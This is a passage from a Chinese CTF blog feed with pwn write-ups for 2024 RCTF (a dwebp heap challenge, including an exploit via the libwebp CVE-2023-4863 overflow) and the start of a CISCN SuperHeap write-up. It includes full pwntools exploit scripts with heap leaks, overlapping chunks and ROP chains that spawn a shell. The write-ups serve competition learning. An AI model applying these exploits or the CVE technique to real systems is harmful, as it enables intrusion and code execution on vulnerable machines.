id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><h3 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>sizeè¿‡å¤§çš„è¯è¿˜æ˜¯ä¼šç”³è¯·feedbackç»“æ„ä½“ï¼Œä½†æ²¡æœ‰åˆå§‹åŒ–</p><img src="/2024/05/28/2024rctfpwnwp/f000.png" class title="f000"><ul><li>å¦‚æœæ˜¯ä»tcacheä¸­ç”³è¯·chunk contentæŒ‡é’ˆå°±æ˜¯åŠ å¯†è¿‡çš„nextæŒ‡é’ˆ</li><li>å¦‚æœæ˜¯unsorted binæ®‹ç•™çš„åˆšå¥½0x20çš„chunkï¼Œä¼šå…ˆæ”¾è¿›tcacheå†è¿”å›ï¼ŒåŒä¸Š</li><li>å¦‚æœæ˜¯åˆ‡å‰²unsorted binçš„è¯ä¸ä¼šå‡ºç°è¿™ç§é—®é¢˜â†‘</li><li>å¯ä»¥ç”¨unsorted binæ®‹ç•™çš„æŒ‡é’ˆæ”¹main_arenaï¼Œé€ å †å—é‡å </li></ul><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How many words do you want to feedback?\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><br>p=process(<span class="hljs-string">&#x27;./dwebp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>libcbase=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21b110</span><br>heap=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x2b0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x150</span>+p64(<span class="hljs-number">0x140</span>)+p64(<span class="hljs-number">0x3d0</span>))<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x141</span>)+p64(libcbase+<span class="hljs-number">0x21ace0</span>)*<span class="hljs-number">2</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;How many words do you want to feedback?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10000</span>).encode())<br><br>edit(<span class="hljs-number">2</span>,p64(heap+<span class="hljs-number">0x8f0</span>)+p64(heap+<span class="hljs-number">0x3e0</span>)+p64(heap+<span class="hljs-number">0x2d0</span>)*<span class="hljs-number">2</span>)<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x140</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(libcbase+<span class="hljs-number">0x222200</span>)+p64(<span class="hljs-number">0x100</span>))<br><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>stack=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(stack)+p64(<span class="hljs-number">0x100</span>))<br><br>ret=libcbase+<span class="hljs-number">0x0000000000029139</span><br>rdi=libcbase+<span class="hljs-number">0x000000000002a3e5</span><br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><p><em>è¿˜æ˜¯ä¸å¤Ÿæ·±åˆ»ï¼Œå†è´´ä¸€æ¬¡~~~&#x2F;&#x2F;&#x2F;(^v^)\\\~~~</em></p><img src="/2024/05/28/2024rctfpwnwp/sendline.jpg" class title="sendline"><h3 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p><a href="https://github.com/mistymntncop/CVE-2023-4863">CVE-2023-4863</a></p><p><em>æ‡’å¾—çœ‹åŸç†äº†</em></p><ul><li>bad.webpå¯ä»¥ç›´æ¥è§¦å‘æŠ¥é”™ï¼Œæ£€æµ‹æ˜¯å¦æœ‰æ´</li><li>nso.webpæ˜¯å¯æ§æº¢å‡ºPOC</li></ul><p>bad.webpå’Œnso.webpéƒ½ä¼šé€ æˆè¶Šç•Œï¼Œä½†bad.webpçš„è¶Šç•Œæ˜¯è¿ç»­çš„ä¸”ä¸å¯æ§</p><img src="/2024/05/28/2024rctfpwnwp/bad.png" class title="bad"><p>nso.webpçš„æº¢å‡ºä¸è¿ç»­ï¼Œå¯ä»¥é€šè¿‡å †é£æ°´é¿å…ç ´åé‡è¦æ•°æ®</p><img src="/2024/05/28/2024rctfpwnwp/overflow.png" class title="overflow"><img src="/2024/05/28/2024rctfpwnwp/nso.png" class title="nso"><p>å¤§æ¦‚æ€è·¯å°±æ˜¯é€šè¿‡overflowæŠŠsizeæ”¹å¤§è¿›è¡Œè¶Šç•Œè¯»å†™</p><p><em><strong>ä¸€ä¸ªå°ï¼ˆdaï¼‰æ’æ›²</strong></em></p><p><em>æœ‰ä¸ªç¬¨æ¯”å‘base64çš„æ—¶å€™ç”¨çš„sendlineï¼Œé•¿åº¦æ ¡éªŒæ²¡è¿‡ç›´æ¥è·³è¿‡äº†base64çš„è§£ç ï¼Œèƒ½è§¦å‘æ‰æ€ª</em></p><h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How many words do you want to feedback?\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Please input your feedback:\n&#x27;</span>,content)<br><br><br>p=process(<span class="hljs-string">&#x27;./dwebp&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>libcbase=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x21b110</span><br>heap=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x2b0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;nso.webp&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    data=file.read()<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1d0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x230</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x3630</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=base64.b64encode(data)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;Your webp format image in base64:\n&#x27;</span>,payload)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x34b0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(libcbase+<span class="hljs-number">0x222200</span>)+p64(<span class="hljs-number">8</span>))<br><br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Feedback:\n&#x27;</span>)<br>stack=u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(stack-<span class="hljs-number">0x1a0</span>)+p64(<span class="hljs-number">0x200</span>))<br>ret=<span class="hljs-number">0x0000000000029139</span>+libcbase<br>rdi=<span class="hljs-number">0x000000000002a3e5</span>+libcbase<br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>edit(<span class="hljs-number">1</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="rvm"><a href="#rvm" class="headerlink" title="rvm"></a>rvm</h1><p><em><strong>â€œé€†å®Œäº†æ²¡æ‰¾åˆ°æ´ï¼Ÿâ€</strong> wjyåšvmçš„ç»å…¸æ“ä½œç½¢äº†</em></p><p><em>ä¸²é¢‘äº†ï¼Œè¿™æ˜¯çŸ©é˜µæ¯Îµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~</em></p><p><em>è¿™é¢˜æ¯”èµ›çš„æ—¶å€™æ²¡å®Œå…¨é€†å®Œ</em></p><p>çº¯é€†å‘é¢˜æ‡’å¾—åšäº†ï¼Œ è¯¦æƒ…è§<a href="https://mp.weixin.qq.com/s/yD-KaYK9-TjhJVhWuHkU1A">S1uM4içš„wp</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 CISCNåˆèµ› pwn wp</title>
    <link href="/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/"/>
    <url>/2024/05/20/2024%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bpwn-wp/</url>
    
    <content type="html"><![CDATA[<p>ä¸¤å¤©æé™speed runï¼Œæƒ¯ä¾‹åæ€ï¼šè¿™ä¸¤å‘¨é¢“äº†ï¼ŒçŠ¶æ€ä¸å¯¹ï¼Œé€Ÿåº¦è¿˜æ˜¯å¤ªæ…¢ï¼Œå¸Œæœ›ä¿æŒè¿™ç§èŠ‚å¥</p><span id="more"></span><h1 id="SuperHeap"><a href="#SuperHeap" class="headerlink" title="SuperHeap"></a>SuperHeap</h1><p>è¿™æ®µæ—¶é—´æœ€æˆå‰§çš„äº‹æƒ…ï¼šæ¯”èµ›ç»“æŸå‰5åˆ†é’Ÿç”µè„‘æ­»æœºäº†^V^</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p><em>ä¸ºä»€ä¹ˆå›½èµ›è¿™ä¹ˆå–œæ¬¢go</em></p><ul><li>é€†å‘8.3ä¸€æŠŠæ¢­</li><li>äº¤äº’æ¯”è¾ƒéº»çƒ¦ï¼Œå¥—äº†ä¸€å±‚base64ï¼Œä¸€å±‚protobufï¼Œä¸€å±‚base32ï¼ŒçœŸæ˜¯å¥—å¥—åˆå¨ƒå¨ƒï¼Œ<em>protoç”¨pbtkæå–å³å¯é£Ÿç”¨</em></li><li>ç»æµ‹è¯•editå¯æº¢å‡ºï¼Œé‚£å°±ç®€å•äº†ï¼Œ<em>è°è¿˜é€†å‘å•Šï¼Œç›²çŒœæ°¸è¿œçš„ç¥</em></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><ul><li><p>æº¢å‡ºæŠŠç©ºå­—ç¬¦éƒ½ç›–äº†å³å¯å¸¦å‡ºä¸‹ä¸€ä¸ªchunkçš„å†…å®¹ï¼Œ<em>ç”±äºæ²™ç®±å †æ¯”è¾ƒä¹±ï¼ŒçœŸéº»çƒ¦</em></p></li><li><p>bookçš„ç®¡ç†ç»“æ„ä½“ä¹Ÿæ˜¯å†™åœ¨å †é‡Œçš„ï¼Œå¯ä»¥ç”¨ä¸Šä¸€ä¸ªchunkè¦†ç›–ç®¡ç†ç»“æ„ä½“çš„æŒ‡é’ˆä»»æ„å†™</p><p><em><strong>æ¯”èµ›çš„æ—¶å€™å°±åšåˆ°è¿™äº†ï¼Œç„¶åæƒ³å†™æ ˆç»“æœå‘ç°è¿™ä¸ªgoç”¨çš„ä¸æ˜¯æ­£å¸¸çš„æ ˆä¸”æ ˆåœ°å€æ— æ³•é¢„æµ‹^V^ï¼Œæ­¤æ—¶è·ç¦»æ¯”èµ›ç»“æŸè¿˜æœ‰ä¸åˆ°åäº”åˆ†é’Ÿå®Œå…¨ä¸å¤Ÿæˆ‘æ‰“IOï¼Œç¬‘æ­»æ—©çŸ¥é“ä¸çœ‹vmçœ‹è¿™ä¸ªè¯´ä¸å®šå°±å‡ºäº†</strong></em></p></li><li><p>house of appleæ‰“IOï¼Œorw</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> bookProto_pb2<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode64</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> base64.b64encode(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode32</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> base64.b32encode(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">protoencode</span>(<span class="hljs-params">title,author,isbn,date,price,stock</span>):<br>    book=bookProto_pb2.CTFBook()<br>    book.title=encode64(title)<br>    book.author=encode64(author)<br>    book.isbn=encode64(isbn)<br>    book.publish_date=encode64(date)<br>    book.price=price<br>    book.stock=stock<br>    pack=book.SerializeToString()<br>    <span class="hljs-keyword">return</span> pack<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">idx,title,author,isbn,date,price,stock</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Special Data: &#x27;</span>,encode32(protoencode(title,author,isbn,date,price,stock)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">see</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">returnn</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,title,author,isbn,date,price,stock</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span 